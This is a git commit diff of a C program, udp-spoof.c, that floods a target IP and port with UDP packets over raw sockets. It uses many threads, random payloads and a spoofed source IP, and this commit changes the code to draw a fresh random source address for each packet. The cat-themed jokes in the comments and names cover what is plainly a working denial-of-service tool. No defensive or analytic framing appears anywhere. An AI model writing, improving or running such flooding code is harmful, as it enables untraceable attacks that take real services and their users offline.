abd8d76f6815e3d43afe4bcaf7f88fb71c55f9fd
Sheep <128471020+lilsheepyy@users.noreply.github.com>
2024-02-27 17:09:26 +0100

    Update udp-spoof.c

--- udp-spoof.c
+++ udp-spoof.c
@@ -8,75 +8,82 @@
 #include <unistd.h>
 #include <time.h>
 #include <pthread.h>
-#include <netinet/in.h> // Include this header for inet_cksum
+#include <netinet/in.h> // Include this for inet_cksum
 
-#define PAYLOAD_SIZE   1440   
-#define MAX_THREADS   100
-#define TIMEOUT   9999   
+#define PACKET_STUFFING  1440 
+#define MAX_KITTENS   100   
+#define PAUSE_TIME  9999  
 
-// The target shall soon feel the wrath of the mighty hairball of doom!
+// Our target... shall we go for the laser pointer this time?
 struct sockaddr_in target;
 
-void *send_udp(void *arg) {
+// Generates a random IP address - cats wandering all over the net
+uint32_t generate_random_ip() {
+    uint32_t ip =   0;
+    for (int i =   0; i <   4; i++) {
+        ip = (ip <<   8) | (rand() %   256);
+    }
+    return ip;
+}
+
+void *launch_furmissile(void *arg) {
     int sockfd;
     struct sockaddr_in src;
-    char payload[PAYLOAD_SIZE];
+    char payload[PACKET_STUFFING];
 
     sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
     if (sockfd <   0) {
-        perror("Failed to put the cat in the socket :(");   
-        exit(EXIT_FAILURE); // Cat doesn't like failure. Will hiss & retreat.
+        perror("Trouble getting the catnip ready :(");   
+        exit(EXIT_FAILURE); // No catnip, no fun. 
     }
 
-    // Cat stealth mode: activate! Randomizing tracks...
-    src.sin_family = AF_INET;
-    src.sin_port = htons(rand() %   65535 +   1);   
-    src.sin_addr.s_addr = rand();   
-
     struct udphdr udp;
-    udp.source = src.sin_port;
+    udp.source = htons(rand() %   65535 +   1); // Cat's gotta be nimble
     udp.dest = target.sin_port;
-    udp.len = htons(sizeof(udp) + PAYLOAD_SIZE);
+    udp.len = htons(sizeof(udp) + PACKET_STUFFING);
 
     struct iphdr ip;
     ip.ihl =   5;
     ip.version =   4;
     ip.tos =   0;
-    ip.tot_len = htons(sizeof(ip) + sizeof(udp) + PAYLOAD_SIZE);
+    ip.tot_len = htons(sizeof(ip) + sizeof(udp) + PACKET_STUFFING);
     ip.id = htons(rand());
     ip.frag_off =   0;
     ip.ttl =   64;   
     ip.protocol = IPPROTO_UDP;
     ip.check =   0;   
-    ip.saddr = src.sin_addr.s_addr;
     ip.daddr = target.sin_addr.s_addr;
 
-    char packet[sizeof(ip) + sizeof(udp) + PAYLOAD_SIZE];
+    char packet[sizeof(ip) + sizeof(udp) + PACKET_STUFFING];
 
     while (1) {
-        // Hairball payload - each one unique (and slightly horrifying)
-        for (int i =   0; i < PAYLOAD_SIZE; i++) {   
+        // New hiding spot for each packet
+        src.sin_family = AF_INET;
+        src.sin_addr.s_addr = generate_random_ip();
+
+        // Prepare a surprise furball of data!
+        for (int i =   0; i < PACKET_STUFFING; i++) {   
             payload[i] = rand() %   256;
         }
 
+        ip.saddr = src.sin_addr.s_addr; 
         ip.check =   0;
         ip.check = inet_cksum((unsigned short *)&ip, sizeof(ip));
 
-        
-        udp.check =   0;  // Checksums? Pfft. Cats never follow 'rules'.
+        udp.check =   0; // Cats don't play by the rules
         udp.check = inet_cksum((unsigned short *)&udp, sizeof(udp));
 
         memcpy(packet, &ip, sizeof(ip));
         memcpy(packet + sizeof(ip), &udp, sizeof(udp));
-        memcpy(packet + sizeof(ip) + sizeof(udp), payload, PAYLOAD_SIZE);
+        memcpy(packet + sizeof(ip) + sizeof(udp), payload, PACKET_STUFFING);
 
         if (sendto(sockfd, packet, sizeof(packet),   0,   
                    (struct sockaddr *)&target, sizeof(target)) <   0) {
-            perror("Failed to send cat to target :(");   
-            exit(EXIT_FAILURE); // A missed hairball? Catastrophe!
+            perror("Furmissile delivery failed! :(");   
+            exit(EXIT_FAILURE); 
         }
 
-        usleep(1); // Short catnap between pounces
+        usleep(1); // Gotta catch a quick nap between attacks
     }
 
     close(sockfd);
@@ -85,34 +92,34 @@ void *send_udp(void *arg) {
 
 int main(int argc, char *argv[]) {
     if (argc !=   5) {
-        fprintf(stderr, "Usage: %s ip port threads timeout\n", argv[0]);
+        fprintf(stderr, "Usage: %s ip port kittens timeout\n", argv[0]);
         return EXIT_FAILURE;
     }
 
-    // Plotting world domination... *evil kitty laughter*
+    // Commence operation: Yarn Mayhem!
     target.sin_family = AF_INET;
     target.sin_port = htons(atoi(argv[2]));
     target.sin_addr.s_addr = inet_addr(argv[1]);
-    int threads = atoi(argv[3]);
+    int kittens = atoi(argv[3]);
     int timeout = atoi(argv[4]);
 
-    // Seed the random number generator
+    // Seed the random number generator for maximum chaos 
     srand(time(NULL));
 
-    // Unleashing the kitten army!   
-    pthread_t thread_ids[MAX_THREADS];
-    for (int i =   0; i < threads; i++) {
-        if (pthread_create(&thread_ids[i], NULL, send_udp, NULL) !=   0) {
-            perror("Failed to run one of our worker cats :("); // Yowl of disapproval!
+    // Deploying the furry squad!
+    pthread_t thread_ids[MAX_KITTENS];
+    for (int i =   0; i < kittens; i++) {
+        if (pthread_create(&thread_ids[i], NULL, launch_furmissile, NULL) !=   0) {
+            perror("Failed to deploy a kitten! :("); 
             exit(EXIT_FAILURE);
         }
     }
 
-    // Basking in the ensuing chaos for a bit...
+    // Let the chaos reign... for a little while
     sleep(timeout);
 
-    // Alright, playtimes over. Cats are fickle.
-    for (int i =   0; i < threads; i++) {
+    // Alright, time to bring the kittens home
+    for (int i =   0; i < kittens; i++) {
         pthread_cancel(thread_ids[i]);
     }
 
